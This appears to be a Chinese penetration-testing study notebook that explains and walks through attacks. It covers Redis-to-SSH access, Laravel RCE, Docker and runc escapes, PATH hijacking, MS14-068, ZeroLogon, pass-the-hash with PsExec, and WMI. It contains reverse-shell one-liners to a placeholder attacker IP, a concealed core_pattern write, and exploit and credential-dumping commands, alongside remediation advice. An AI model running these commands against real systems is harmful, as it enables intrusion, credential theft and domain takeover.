# 用到的姿势、原理

## Ssh公钥认证机制
```
ssh -i /root/.ssh/id_rsa_red7 root@192.168.162.128 
```

- 核心原理是：利用 SSH 的公钥认证机制，绕过密码输入，直接以 root 身份登录目标服务器。
- 命令参数拆解
  - ssh：Secure Shell 的缩写，是 Linux 系统中用于远程加密登录和管理服务器的标准协议。
  - -i /root/.ssh/id_rsa_red7：
    - -i 代表 identity file（指定身份文件/私钥）。
    - /root/.ssh/id_rsa_red7 是您之前在 Kali 上通过 ssh-keygen 生成的私钥文件的绝对路径。
    - 作用：告诉 SSH 客户端：“不要问我密码，请用这把私钥去和目标服务器进行身份验证”。
  - root：指定您要登录目标服务器的哪个用户。之前通过 Redis 将公钥写入了目标机的 /root/.ssh/authorized_keys，所以这里必须指定 root 用户。
  - @：分隔符，前面是用户名，后面是主机地址。
  - 192.168.162.128：目标服务器（Web1）的 IP 地址。

## Redis未授权访问
>Redis 未授权访问本质上是一个配置缺陷，而非 Redis 软件本身的代码漏洞。当 Redis 服务暴露在公网且未设置密码认证时，攻击者可以直接连接并利用其文件写入能力，实现获取服务器权限的目的。

**漏洞成因**：为什么会被“未授权”？

- Redis 默认的配置存在两个“致命”的默认值：
  - 监听地址：默认绑定 0.0.0.0:6379，意味着允许来自任何网卡的连接。
  - 认证密码：默认情况下 require pass 为空，也就是没有密码。
  - 如果管理员没有修改这些默认值，并且防火墙也没有限制 6379 端口的访问，那么任何能连上这台服务器的人，都可以直接操作 Redis 数据库。
- 利用原理：从“读写数据”到“执行命令”
  - Redis 本身不能直接执行系统命令，但它的数据持久化机制给了攻击者可乘之机。
  - Redis 的数据保存在内存里，为了防止丢失，它会定期把数据“保存”到磁盘上。管理员可以用 CONFIG SET 命令动态修改两个关键参数：
    - dir：文件保存的目录。
    - dbfilename：保存的文件名。
    - 攻击者就是通过修改这两个参数，让 Redis 把攻击者预先写入内存的数据（比如一句话木马、SSH 公钥、计划任务脚本），保存到系统里任何有写权限的目录下，并命名成任何文件名。

## 非对称加密（公钥认证）

- SSH 登录通常有两种方式：密码登录和密钥登录。密钥登录原理基于非对称加密算法（RSA）：
- 密钥对生成（在 Kali 上做的）：
  - 当运行 ssh-keygen -t rsa 时，系统生成了两个文件：
    - id_rsa_red7：私钥
    - id_rsa_red7.pub：公钥，可以公开给任何人。

  - 数学上，用私钥加密的数据，只有对应的公钥能解开；反之，用公钥加密的数据，只有对应的私钥能解开。

  - 我们通过 Redis 漏洞，把公钥（.pub 文件里的内容）写入了目标服务器的 /root/.ssh/authorized_keys 文件中。这就好比我们在目标服务器的 root 房间里，安装了一把只有我们自己手里那把私钥才能打开的“锁”。
- 登录验证

  - 当输入ssh 命令连接服务器时
  - Kali 欺骗服务器：“我是 root，我想登录，我有一把私钥”。
  - 服务器查找到 /root/.ssh/authorized_keys 里的公钥，说：“行，那我发一个随机字符串给你，你用你的私钥加密一下发给我”。
  - Kali 用 /root/.ssh/id_rsa_red7（私钥）加密了字符串并发回。
  - 服务器用之前存好的公钥去解密。如果解密出来的字符串和一开始发出去的一样，就证明“你确实拥有对应的私钥”。
- 验证通过，服务器直接建立连接，就获得了最高权限。

## 永恒之蓝（MS17-010）
>Windows SMBv1 协议中的一个远程内核溢出漏洞,本质是 Windows 内核驱动 srv.sys 在处理 SMB 请求时发生了缓冲区溢出。

当攻击者发送一个特殊的 SMB 数据包时，系统需要计算其中一段数据（FEA list）的大小。代码里用错了数据类型（误用 WORD 强制转换），导致计算出的长度比实际长度要小。系统按照这个“缩水”的尺寸去分配内存，随后把真实数据拷进去时，就会溢出并覆盖掉相邻的内核数据结构。通过精心构造覆盖的数据，攻击者就能劫持程序执行流，在内核态以 SYSTEM 最高权限运行任意代码。

- 漏洞端口：TCP 445（SMB 文件共享服务）。

- 受影响系统：Windows 7、Server 2008 R2、Server 2012 等未打补丁的版本

- 利用前提：目标开放 445 端口，且未安装 MS17-010 补丁。攻击机能与目标互通。

## Laravel Debug mode RCE（CVE-2021-3129）
>核心利用条件并非框架版本老旧，而是生产环境中错误地开启了 APP_DEBUG=true。攻击者利用 Ignition 组件（Laravel 默认的错误调试组件）对文件操作的不安全处理，通过“日志投毒”结合 phar:// 反序列化，最终实现无需认证的任意命令执行。

漏洞的利用链条可以概括为：利用 Ignition 的文件写入功能污染日志文件 -> 将日志文件转换为合法的 PHAR 文件 -> 触发 PHAR 反序列化执行恶意代码。

**关键组件**：facade/ignition（Laravel 的默认错误页面渲染包）。漏洞存在于 MakeViewVariableOptionalSolution 类中，该类会调用 file_get_contents() 读取 viewFile 参数指定的文件，并在简单替换后通过 file_put_contents() 写回。

**利用前提**：APP_DEBUG = true：这是必要条件，它使得 Ignition 的解决方案（Solution）路由处于活跃状态。

**受影响版本**：Laravel < 8.4.2 且 Ignition < 2.5.2。

**详细利用步骤**:

-  清空日志文件
   -  利用 php://filter 的 convert.base64-decode 过滤器特性（它会忽略非 Base64 字符），反复写入无效的 Base64 数据，将 laravel.log 的内容清空或重置为可控状态。
-  生成 PHAR Payload 并写入日志
   -  使用 phpggc 工具生成针对 Laravel/Monolog 的利用链（例如 monolog/rce1），执行 system('id') 等命令。由于日志文件最终需要被识别为 PHAR，且需要绕过日志中的干扰字符，通常需要将生成的 PHAR 文件进行 Base64 编码，再转换为 Quoted-Printable 格式（即每个字符变成 =XX=00 的形式）后写入日志
-  触发反序列化获得shell
   -  Zx再次发送请求，通过 phar:// 伪协议去访问刚才被污染并清理过的日志文件。当 PHP 通过 phar:// 流包装器解析该文件时，会自动对其中的元数据（Meta-data）进行反序列化，从而触发 phpggc 生成的 Gadget 链，执行预设的命令。

**自动化利用工具**：CVE-2021-3129.py（多个 GitHub 仓库均有提供）

```
# 执行命令
python3 CVE-2021-3129.py http://target.com --cmd 'id'
# 或者写入 Webshell（视脚本功能而定）
```

**修复与防御建议**

- 首要措施：确保生产环境的 .env 文件中 APP_DEBUG=false。这是阻断该漏洞利用的最直接手段。

- 版本升级：将 facade/ignition 升级至 2.5.2 或更高版本，或将 Laravel 框架升级至 8.4.2 及以上版本。

- 访问限制：在 Web 服务器（如 Nginx）层面对 /_ignition/execute-solution 路径的访问进行限制或封禁，仅允许受信任的 IP 访问。

## Docker逃逸
>Docker 逃逸的核心逻辑是突破容器与宿主机之间的隔离边界。绝大多数现实中的逃逸并非利用复杂的 0day，而是源于危险配置（如特权模式、敏感挂载）或运行时组件的历史漏洞。一旦逃逸成功，攻击者便能在宿主机上获得与容器内进程相对应的权限（通常是 root），进而控制该主机上的所有容器与数据。

### 配置类逃逸（最常见）
>这类逃逸不依赖软件漏洞，纯粹因为启动容器时给予了过高权限或挂载了敏感路径。

1. 特权模式 (--privileged)
   这是危害最大的配置之一。该标志会授予容器所有 Linux Capabilities，解除设备访问限制，并禁用 seccomp、AppArmor 等安全机制。在特权容器内，通常可以直接看到宿主机的块设备（如 /dev/sda）。

   **利用步骤与原理：**

   - 挂载宿主机磁盘：执行 mkdir /test && mount /dev/sda1 /test。该命令将宿主机第一个磁盘分区挂载至容器内 /test 目录，使宿主机根文件系统内容（/etc、/root 等）在容器内直接可见、可读写。其本质是借助特权模式突破设备隔离，将宿主机存储资源接入容器命名空间。

   - 切换根目录：执行 chroot /test /bin/bash。chroot 将当前进程及其子进程的根目录切换为 /test（即宿主机磁盘），并启动 bash。此后该 shell 的文件系统视角即为宿主机根目录，可对宿主机文件进行读写，包括修改 /etc/shadow、植入 SSH 公钥等，从而在文件系统层面实现对宿主机的控制。

   - 技术要点：chroot 仅改变文件系统视角，不改变进程所属的 PID、网络等命名空间，也不提升权限。容器内进程通常以 root 运行，因此 chroot 后即获得宿主机文件的 root 读写权限；若需完全进入宿主机命名空间，还需配合 nsenter 等工具。

   **结论**：--privileged 同时赋予容器"可见宿主机块设备"与"可挂载设备"两项能力，使上述逃逸链路得以成立。该配置应视为高危项，生产环境应严格禁止使用，遵循最小权限原则，以细粒度 Capabilities 替代完全特权模式。


2. 挂载 Docker Socket (/var/run/docker.sock)
   容器本身没有特权，但它获得了一个“遥控器”，可以命令宿主机上拥有 root 权限的 Docker 守护进程去创建一个新的、真正拥有特权的容器，并借此访问宿主机文件系统。

   **核心原理：Socket 即控制权**
   /var/run/docker.sock 是 Docker 守护进程（dockerd）的 Unix 套接字。dockerd 以宿主机 root 身份运行，任何能读写这个 socket 的进程，都能向守护进程发送完整的 Docker API 指令，包括创建容器、指定挂载和权限。把 socket 挂进容器，等于把宿主机 Docker 的“无认证控制面板”交给了容器内的进程。
   ```
   docker run -it -v /:/host ubuntu /bin/bash
   ```
   - 这条命令是通过 socket 向宿主机 Docker 守护进程发出的请求，要求它创建一个新容器。

   - -v /:/host：这是关键。它要求将宿主机的根目录 / 挂载到新容器内的 /host 路径下。由于指令是发给宿主机守护进程的，这里的 / 指的就是宿主机的真实根文件系统。

   - ubuntu /bin/bash：指定新容器使用 ubuntu 镜像并启动 bash。

   执行后，进入的是一个全新的容器。在这个容器里，ls /host 看到的就是宿主机的文件系统（/etc、/root、/home 等）。此时你已经在文件层面接触到了宿主机，但还没有“站进去”。

   ```
   chroot /host
   ```
   - chroot 将当前进程（及后续子进程）的根目录切换为 /host，也就是宿主机的根目录。

   - 执行后，当前 shell 的 / 就变成了宿主机的 /。你可以直接读写宿主机的 /etc/shadow、修改 /root/.ssh/authorized_keys，在文件系统层面获得了宿主机的 root 控制权。

   **与特权容器逃逸的关键区别**
   --privileged 逃逸，是容器自己就有权挂载宿主机磁盘（mount /dev/sda1）。而 Socket 逃逸中，原容器不需要任何特权，它只是通过 socket “委托”宿主机 Docker 去执行挂载操作。原容器扮演的是“指挥官”，新创建的容器才是“执行者”。

3. 挂载宿主机 /proc 并利用 core_pattern
   >如果容器挂载了宿主机的 /proc 目录，且对其有写权限，攻击者可以篡改内核的 core_pattern。当宿主机上任何进程崩溃时，内核会以 root 权限执行 core_pattern 指定的程序，从而触发逃逸。

   **核心在于滥用 Linux 内核处理进程崩溃时的机制**：当系统发生核心转储（core dump）时，内核会以 root 权限执行 core_pattern 中指定的程序或脚本。如果容器内能写入宿主机的 core_pattern，就相当于获得了在宿主机上以 root 执行任意代码的能力。

   **利用条件**：容器启动时挂载了宿主机的 /proc 目录（或其子目录如 /proc/sys/kernel），并且容器内进程拥有对该挂载点的写权限。

   **核心机制**：/proc/sys/kernel/core_pattern 文件若以管道符 | 开头，其后的字符串会被内核解释为一个用户空间程序。当任何进程崩溃时，内核会以宿主机 root 身份执行该程序。

   **详细利用步骤**

   - 第一步：定位容器文件在宿主机上的真实路径
     - 写入 core_pattern 的脚本路径必须是宿主机视角的路径，因为内核是在宿主机文件系统中查找并执行该程序的。容器内的 /tmp/exp.sh 在宿主机上对应的是一个深层路径。

     - 在容器内查看挂载信息，提取 upperdir 或 workdir 的路径：

      ```bash
      cat /proc/mounts | grep docker
      # 或
      sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
      ```
     - 输出中类似 upperdir=/var/lib/docker/overlay2/<ID>/diff 的部分，其对应的宿主机路径就是容器内文件系统的真实映射位置。容器内 /tmp/exp.sh 在宿主机上的路径即为 /var/lib/docker/overlay2/<ID>/diff/tmp/exp.sh。

   - 第二步：在容器内准备恶意脚本
     - 在容器内创建一个可执行的脚本（如反弹 shell 或写入 SSH 公钥），并赋予执行权限：

      ```bash
      cat > /tmp/exp.sh <<'EOF'
      #!/bin/bash
      # 反弹 shell 示例
      bash -i >& /dev/tcp/攻击机IP/端口 0>&1
      EOF
      chmod +x /tmp/exp.sh
      ```

   - 第三步：篡改宿主机的 core_pattern
     - 通过挂载进容器的宿主机 proc 路径，将 core_pattern 指向刚才准备的脚本的宿主机绝对路径：

      ```bash
      # 假设宿主机的 /proc 挂载在容器的 /host_proc
      echo -e "|/var/lib/docker/overlay2/<ID>/diff/tmp/exp.sh \rcore" > /host_proc/sys/kernel/core_pattern
      ```
     - \r 的作用是利用回车符覆盖后续内容，使得管理员用 cat 查看该文件时，视觉上只显示 core，起到一定的隐蔽效果。

   - 第四步：触发崩溃，执行 payload
     - 在容器内运行一个会立即触发段错误的程序（例如空指针解引用）：

      ```c
      // /tmp/crash.c
      int main(void) { int *a = NULL; *a = 1; return 0; }
      ```
      编译并执行：

      ```bash
      gcc /tmp/crash.c -o /tmp/crash && /tmp/crash
      ```

     - 该进程崩溃后，宿主机的内核会捕获到事件，读取被篡改的 core_pattern，并以 root 权限执行 /var/lib/docker/overlay2/<ID>/diff/tmp/exp.sh。攻击机监听相应端口即可获得宿主机权限的 shell。


### 漏洞类逃逸（需特定版本）
CVE-2019-5736 (runc 逃逸)
>核心是一个文件描述符处理缺陷，它允许容器内的 root 进程覆写宿主机上的 runc 二进制文件。其利用不依赖内核漏洞，而是滥用了 Linux 在 /proc/self/exe 上的行为特性。

**漏洞前提与影响范围**
利用需要满足两个条件之一：使用攻击者可控的镜像启动新容器，或攻击者曾对某容器有写权限并通过 docker exec 附着进去。容器内进程需以 root 运行，且容器本身未被 user namespace 隔离（即宿主机 root 映射进了容器）。

受影响组件包括 Docker、containerd、Podman、CRI-O 等所有默认使用 runc 的容器运行时。Docker 版本低于 18.09.2，或 runc 版本低于 1.0-rc6.2，均存在风险。

**利用原理与步骤**

- 第一步：让 runc 执行攻击者指定的程序

   - 攻击者在容器内将某个将被 runc 调用的可执行文件（例如 /bin/bash）替换为一个脚本，其 shebang 行指向 /proc/self/exe：

      ```bash
      #!/proc/self/exe
      ```
   - 当用户执行 docker exec 进入该容器并运行该文件时，runc 会解析这个 shebang，导致宿主机上的 runc 二进制自身被作为解释器执行。此时，runc 以宿主机 root 身份运行，且其 /proc/self/exe 指向的就是宿主机上的 runc 文件本身。

- 第二步：绕过内核的写保护

   - Linux 内核不允许在 runc 正在运行时覆写其二进制文件。攻击者通过以下方式绕过：
     - 用一个独立进程以 O_PATH 标志打开 /proc/self/exe 获取文件描述符，再通过 /proc/self/fd/<编号> 以 O_WRONLY 方式重新打开该文件，然后在一个循环中持续尝试写入。

- 第三步：写入恶意代码

   - 当 runc 进程退出（例如 docker exec 会话结束）的瞬间，内核的写保护解除，循环中的写入操作成功，宿主机上的 runc 二进制被替换为攻击者的 payload。此后，任何新的 docker run 或 docker exec 都会以宿主机 root 权限执行被篡改的 runc，攻击者从而控制宿主机。

**修复与缓解**

- 根本修复：升级 runc 至 1.0-rc6.2 或更高版本，或将 Docker 升级至 18.09.2+。修复补丁的核心是阻止容器进程通过 /proc/self/exe 获取对宿主机 runc 二进制的写访问。

- 临时缓解：对 runc 二进制文件设置不可变属性（chattr +i），可阻止覆写尝试。但这仅是权宜之计，不应替代升级。此外，正确使用 user namespace（使宿主机 root 不映射进容器）可从根本上阻断该漏洞的利用路径。

**与配置类逃逸的本质区别**
特权容器逃逸、Socket 挂载逃逸，根源在于管理员给予了过高权限。CVE-2019-5736 则不同：即使容器配置相对正常，只要 runc 版本未修补且容器内进程能以 root 运行，攻击者就能利用运行时自身的代码缺陷完成逃逸。这也是它被视为“经典”的原因——它暴露的是容器基础设施层面的信任边界问题，而非单纯的配置疏忽。



## 环境变量 PATH 劫持提权
>一个拥有 Root 权限的程序，在调用系统命令时没有使用绝对路径，而是依赖环境变量去寻找命令
**攻击原理**

  - 在 Linux 中，当输入一个命令（比如 ls 或 ps）时，系统是根据 PATH 环境变量去寻找的
  - 系统会从左到右依次在每个目录里找，找到第一个匹配的就立刻执行，不再往后找。
  - 正常情况下，ps 程序藏在 /bin/ps 或 /usr/bin/ps。但是，如果我们（作为普通用户）能修改 PATH 变量，把我们自己的目录塞到最前面，并在里面放一个伪造的 ps 程序，那么当 Root 权限的 shell 程序去执行 system("ps") 时，就会优先执行我们伪造的 ps，从而让我们获得 Root 权限。

**劫持流程**

- 准备恶意程序
   ```
   bash
   cd /tmp
   echo "/bin/bash" > ps         #创建一个名为 ps 的文件并写入/bin/bash也就是告诉系统，如果运行这个文件，就打开一个 Bash 终端（命令行）
   chmod 777 ps         #给这个伪造的 ps 文件加上最高权限，确保系统能执行它。
   ```

*(注：如果在实战中，为了更隐蔽且稳拿 Root，这里通常写反弹 Shell 的代码，比如 echo "bash -i >& /dev/tcp/你的IP/端口 0>&1" > ps)*

- 劫持环境变量

   ```bash
   echo $PATH
   export PATH=/tmp:$PATH     # 把 /tmp 目录加到当前环境变量 PATH 的最前面
   ```
   此时，敲下任何命令，系统会先去 /tmp 里找，如果没有，再去后面的目录找。

- 触发执行与提权

   ```bash
   cd /home/jobs
   ./shell
   ```
   执行这个拥有 SUID 权限的程序
   - 操作系统看到 shell 文件带有 SUID 标记，立刻把它提权为 Root 权限运行
   - 程序内部执行到 system("ps");时会根据环境变量查找ps程序
   - 因为 system() 函数会继承我们刚才修改过的环境变量，系统去查 PATH。
   - 系统来到 PATH 的第一站：/tmp。
   - 系统在 /tmp 里看到了我们刚才建的假 ps 文件。
   - 系统非常听话地停止寻找，直接执行了 /tmp/ps。
   - /tmp/ps 里面写的是 /bin/bash。因为此时的父进程是 Root，所以它启动的这个 Bash 终端也是 Root 权限。
   - 至此提权成功

**漏洞的核心**
开发者赋予了程序 Root 权限，却在程序中使用了相对路径去调用其他命令。 防护的方法就是，在 C 语言编程中，只要涉及权限提升，调用系统命令必须使用绝对路径（比如 system("/bin/ps");），且尽量减少 SUID 程序的使用。

## MS14-068（CVE-2014-6324）
>核心缺陷在于 Windows 域控的 Kerberos KDC 未能正确验证 PAC（特权属性证书）的加密签名。普通域用户可利用此缺陷，为自己伪造一个包含 Domain Admins 等高权限组 SID 的 PAC，并让 KDC 在不知情的情况下签发一张“合法”的高权限 TGT 票据。其危害极大，因为攻击者无需获取 krbtgt 账户哈希即可完成提权，门槛远低于黄金票据攻击。

漏洞原理：签名验证的“偷工减料”
在正常的 Kerberos 流程中，PAC 由 KDC 生成并附带加密签名，以防止篡改。MS14-068 的根源在于，未打补丁的 KDC 在验证 PAC 签名时存在逻辑缺陷：它只检查签名长度是否不超过 20 字节，而不强制要求使用带密钥的算法。

这意味着，攻击者可以使用 MD5 等无密钥算法为伪造的 PAC 生成一个短签名，KDC 便会错误地将其视为有效。利用流程大致如下：

获取无 PAC 的 TGT：在 AS-REQ 请求中将 PA-PAC-REQUEST 设为 False，向 KDC 申请一张不包含 PAC 的 TGT。微软默认允许此操作。

伪造 PAC：构造一个 PAC，将当前普通用户的 SID 加入 Domain Admins（512）、Enterprise Admins（519）等高权限组，并用 MD5 等无密钥算法为其生成签名。

请求高权限 TGT：利用第一步获得的无 PAC TGT，向 KDC 的 krbtgt 服务发起 TGS-REQ，并将伪造的 PAC 附加其中。

KDC 错误签发：存在漏洞的 KDC 未能识别签名伪造，验证通过后，将包含伪造高权限 PAC 的新 TGT 返回给攻击者。

🛠️ 利用步骤：从普通账户到域管
利用前提：拥有一个有效的普通域账户（密码或 NTLM 哈希均可），且目标域控未安装补丁 KB3011780。

第一步：生成高权限票据
使用 ms14-068.py（PyKEK 工具包）生成票据。关键参数是 -s 指定的用户 SID，可通过 whoami /user 获取。

bash
python ms14-068.py -u <用户名>@<域名> -p <密码> -s <用户SID> -d <域控地址>
执行成功后，会在当前目录生成一个 .ccache 格式的票据文件（如 TGT_user@domain.ccache）。

第二步：注入票据
将生成的 .ccache 文件传入目标 Windows 主机。在注入前，建议先用 kerberos::purge 清除内存中现有的 Kerberos 票据，避免冲突。然后使用 mimikatz 将票据注入当前会话：

bash
mimikatz.exe "kerberos::ptc TGT_user@domain.ccache" exit
第三步：验证与利用
注入成功后，当前会话便具备了伪造 PAC 中声明的高权限。可以尝试访问域控的 C$ 共享来验证：

cmd
dir \\<域控主机名>\C$
若不再返回“拒绝访问”，则表明提权成功。随后可通过 PsExec、sc 创建服务等方式在域控上执行命令或植入后门。

💡 关键注意点
SID 格式：-s 参数需提供完整的用户 SID（如 S-1-5-21-...-1105），而非域 SID。

DNS 解析：执行脚本的机器需能正确解析域控的 FQDN，否则需在脚本中使用域控 IP，并确保网络可达。

时效性：这是一个 2014 年的漏洞，在现代已打补丁的环境中几乎无法利用。其价值更多在于理解 Kerberos 协议中 PAC 与签名机制的设计缺陷。验证补丁是否存在，可检查系统是否安装了 KB3011780。



## 通达OA_v11.3以下版本任意文件上传加文件包含导致命令执行漏洞
通达OA是由北京通达信科科技有限公司开发的一款办公系统，v11.3以下版本中，攻击者可在未授权的情况下可上传图片木马文件，之后通过精心构造的请求进行文件包含，实现远程命令执行，且攻击者无须登陆认证即可完成攻击。


## CVE-2021-3493提权
>Ubuntu 系统特有的本地提权漏洞。其核心在于 Ubuntu 内核为了支持非特权用户使用容器等功能，打上了一个允许普通用户在命名空间内挂载 OverlayFS 的补丁，但这个补丁在处理文件能力（File Capabilities）时存在校验缺陷，导致普通用户可以借此将权限提升至全局 root 

**漏洞原理**：命名空间边界失效

- 文件能力（File Capabilities）：Linux 将传统的 root 特权拆分成了细粒度的“能力”（如 cap_setuid）。可执行文件可以通过扩展属性（security.capability）携带这些能力，从而在运行时获得对应特权，类似于 SUID 的现代替代方案。

- 用户命名空间（User Namespace）：允许非特权用户创建一套隔离的 UID 映射环境。在该环境内用户可以是“root”（uid 0），但这只是一个映射身份，对宿主机并无真实特权。

- 漏洞的根源在于：当普通用户在自己的用户命名空间内挂载 OverlayFS 并操作文件时，Ubuntu 内核在将文件从 OverlayFS 的“上层”写入到底层文件系统时，未能正确校验携带 security.capability 属性的写入请求是否来自拥有真实特权的 init 命名空间。代码路径绕过了 cap_convert_nscap() 的检查，直接调用 vfs_setxattr() 写入属性 。结果是，一个在命名空间内看似“合法”的能力设置，被物理地写入了底层磁盘文件，而这个文件在命名空间外执行时，其携带的能力将被内核当真，从而赋予进程全局 root 权限 。

**利用步骤**

由于漏洞涉及命名空间的隔离与销毁，成熟的利用代码通常采用两阶段设计，以避免在命名空间内“假 root”的陷阱中原地打转 。

- 前提条件：

  - 目标为受影响的 Ubuntu 版本（如 20.04 LTS，内核版本低于修复版本）。

  - 系统允许非特权用户创建命名空间：sysctl kernel.unprivileged_userns_clone 返回 1 。

- 第一阶段：在命名空间内“投毒”

  - 攻击者编译并运行利用程序。该程序会创建一个子进程，并在其中执行 unshare(CLONE_NEWUSER | CLONE_NEWNS)，进入隔离的用户与挂载命名空间。在这个“沙盒”里，子进程挂载一个 OverlayFS，将一个准备提权的 payload 程序（如 rootshell.c 编译出的二进制）复制到上层目录，然后调用 setxattr 为其设置包含 cap_setuid 等全部能力在内的 security.capability 属性。由于内核校验缺陷，这个属性被成功写入底层存储 。

- 第二阶段：在真实环境中“引爆”

  - 子进程退出，命名空间销毁。此时，宿主机文件系统上已经存在一个携带真实文件能力的 payload 程序。父进程（仍在初始命名空间中，身份为普通用户）直接通过 execl 执行这个程序。内核加载该程序时，读取到其 security.capability 属性，便赋予该进程对应的能力。payload 程序随即利用 cap_setuid 调用 setuid(0)，成功将自身切换为全局 root，并弹出拥有最高权限的 shell 。

**影响范围与修复**

受影响版本（Ubuntu 系列）：

- Ubuntu 14.04 ESM (HWE 4.4)：低于 4.4.0-209

- Ubuntu 16.04 LTS：低于 4.4.0-209

- Ubuntu 18.04 LTS：低于 4.15.0-142

- Ubuntu 20.04 LTS：低于 5.4.0-72

- Ubuntu 20.10：低于 5.8.0-50

修复措施：

- 安装补丁：升级内核至 Ubuntu 安全公告 USN-4916-1 中列出的修复版本 。

- 临时缓解：如果无法立即升级，可禁用非特权用户命名空间：sysctl -w kernel.unprivileged_userns_clone=0。这会阻断利用路径，但可能影响依赖该特性的容器或沙盒应用 。

## Windows zeroLogon域内权限提升（CVE-2020-1472）
>Netlogon 协议在使用 AES-CFB8 加密时，错误地将初始化向量（IV）硬编码为全零。这使得攻击者只需进行约 256 次尝试，就有概率让加密结果与全零输入产生全零输出，从而在无需任何凭据的情况下冒充域控机器账户通过认证，并最终将其密码置空，接管整个域。
>核心前提：攻击者能够与未打补丁的域控制器建立网络连接（通常为 TCP 135 端口），且无需任何有效的域凭据。

- **漏洞原理**

  整个利用链条建立在 Netlogon 认证机制的缺陷之上，核心步骤如下：

  - 绕过认证：攻击者向域控发送包含全零挑战值的认证请求。由于 IV 固定为全零，存在 1/256 的概率，域控计算出的会话密钥加密结果也是全零，从而误认为攻击者持有正确的机器账户密码，认证通过。

  - 关闭加密：认证成功后，攻击者可以在后续的 NetrServerAuthenticate3 调用中取消签名和加密标志位，建立一个明文通信的会话。

  - 重置机器密码：利用该会话，攻击者调用 NetrServerPasswordSet2，将域控计算机账户（如 DC01$）在 AD 数据库中的密码设置为空值。

  - DCSync 接管域控：密码被置空后，攻击者即可使用 DC01$ 账户以空密码身份进行 DCSync 攻击，导出域管理员（甚至 krbtgt）的 NTLM 哈希，进而完全控制域环境。

- **利用流程（以 Linux 攻击机为例）**
  假设目标域控主机名为 DC01，IP 为 10.10.10.1。

  - 第一步：验证漏洞存在
    使用检测脚本确认目标是否存在漏洞。

    ```bash
    python3 zerologon_tester.py DC01 10.10.10.1
    ```
    如果返回 Success，说明目标可被利用。

  - 第二步：清空域控机器账户密码
    运行漏洞利用脚本，将 DC01$ 的密码置空。

    ```bash
    python3 cve-2020-1472-exploit.py DC01 10.10.10.1
    ```
    执行成功后，DC01$ 的密码即为空。

  - 第三步：DCSync 导出域管哈希
    利用已清空的密码，使用 Impacket 的 secretsdump 导出域内凭据。

    ```bash
    secretsdump.py -no-pass -just-dc dm.local/DC01\$@10.10.10.1
    ```
    输出中会包含 Administrator 和 krbtgt 的 NTLM 哈希，后续可通过哈希传递（PtH）或制作黄金票据来持久化控制。

- **核心利用条件**

  - 网络可达性：攻击者必须能通过网络访问目标域控。虽然通常需要已进入内网（即拥有一个“立足点”），但并不要求攻击机已加入域，域外机器只要网络路由可达即可发起攻击。

  - 目标未修复：目标必须是未安装 2020 年 8 月及后续安全更新的 Windows Server 域控制器（或作为域控的 Samba 服务器）。若目标已启用强制模式（Enforcement Mode，2021 年 2 月后默认开启），则攻击会失效。

  - 无需凭据：这是该漏洞最危险的地方，攻击者不需要知道任何域用户或计算机账户的密码，完全以“匿名”状态发起认证绕过攻击。

- **关键注意事项**

  - 必须恢复机器账户密码
  - 直接清空域控机器账户密码会破坏其与 AD 之间的信任关系，可能导致域控服务异常、复制失败等问题。在实际操作中，利用完成后必须恢复原密码。通常的做法是：在攻击前先用 secretsdump 导出 DC01$ 的原哈希，利用成功后，再通过 restorepassword.py 脚本或 Mimikatz 将原密码恢复回去。

- **检测与修复**

  - 修复：安装微软 2020 年 8 月及 2021 年 2 月的安全更新。2021 年 2 月的更新会默认启用强制模式，拒绝不安全的 Netlogon 连接。

  - 检测：关注域控上的 Event ID 5805（机器账户认证失败，大量出现可能是爆破阶段）以及 Event ID 4742（计算机账户被更改，可能是密码被重置）。

## PsExec远控利用

- **原理拆解**

  PsExec 的工作流程可以概括为三个步骤：

  - SMB 连接与文件投放：通过 TCP 445 端口连接目标的 ADMIN$ 共享（即 C:\Windows），将服务程序 PSEXESVC.exe 上传到该目录。

  - 创建并启动服务：通过远程调用服务控制管理器（SCM），在目标上注册一个临时服务，并指向刚上传的 PSEXESVC.exe。随后启动该服务。

  - 管道回传：服务启动后，PsExec 通过命名管道与服务程序通信，将你输入的命令传递过去，并将执行结果回传。

- 关键点在于：Windows 服务默认以 NT AUTHORITY\SYSTEM 身份运行。因此，无论你登录时使用的是域管账户还是其哈希，一旦服务被拉起，命令就是在 SYSTEM 上下文中执行的。这就是为什么拿到域管凭据后，通过 PsExec 能直接获得目标（包括域控）的最高权限 Shell。

- **用密码或哈希“登录”的实操**

  - 场景一：有明文密码（Windows 环境）

    直接使用 Sysinternals 官方 PsExec，指定目标、用户名和密码。加上 -s 参数可以确保以 SYSTEM 身份运行命令（虽然服务本身已经是 SYSTEM，但某些交互场景下显式指定更明确）：

    ```cmd
    PsExec.exe \\<目标IP> -u <域名>\<用户名> -p <密码> -s cmd.exe
    ```
  - 场景二：有 NTLM 哈希（Pass-the-Hash）

    NTLM 认证机制的特殊性在于：它验证的是“你是否持有密码的哈希”，而不是“你是否知道明文密码”。因此，拿到哈希就等于拿到了密码。

  - 在 Linux 攻击机上，使用 Impacket 套件的 psexec.py 是最直接的方式：

    ```bash
    # 格式：psexec.py -hashes :<NTLM哈希> <域名>/<用户名>@<目标IP>
    psexec.py -hashes :a86d277d2bcd8c8184b01ac21b6985f6 CORP/Administrator@10.10.10.1
    ```
    执行成功后，会直接获得一个 SYSTEM 权限的交互式 Shell。

- **关键前提与风险提示**

  - 前提条件：使用的账户（或哈希对应的账户）必须是目标主机的本地管理员，或具备远程创建服务的权限。域管天然满足这一点。

  - 明显的副作用：PsExec 会在目标磁盘上留下 PSEXESVC.exe 文件，并创建/删除一个同名服务。这是它“噪音大”的原因，容易被 EDR 或安全日志（如 Event ID 7045 服务创建）捕获。

  - 哈希的适用范围：在工作组环境中，通常只有内置 Administrator 账户的哈希能直接用于 PTH；但在域环境中，域管理员组内任意成员的哈希都可以用来攻击域内任何机器。

>PsExec 的价值在于它的“直接”：只要有高权限凭据（密码或哈希），它就能用最短路径在目标上获得 SYSTEM Shell，包括域控。也正因如此，它成为横向移动中最经典、也最需要被重点监控的手法之一。


## WMI利用
>WMI 利用的本质，是滥用 Windows 内置的合法管理框架来执行远程命令。它不需要创建服务，也不向磁盘投放需要持久化的明显文件，因此比 PsExec 更隐蔽，不易触发基于服务创建的告警。

- **原理**：合法功能的“武器化”

  - WMI 是 Windows 的标准管理接口。攻击者利用的核心是 Win32_Process 类的 Create 方法。这个方法本意是让管理员远程启动进程，却被用来执行任意命令。以 Impacket 的 wmiexec.py 为例，其流程如下：

    - 远程创建进程：通过 WMI（底层走 DCOM/RPC）在目标上调用 Win32_Process.Create，启动 cmd.exe 来执行指定命令。

    - 重定向输出：命令的输出被重定向写入目标 ADMIN$ 共享下的一个临时文件。

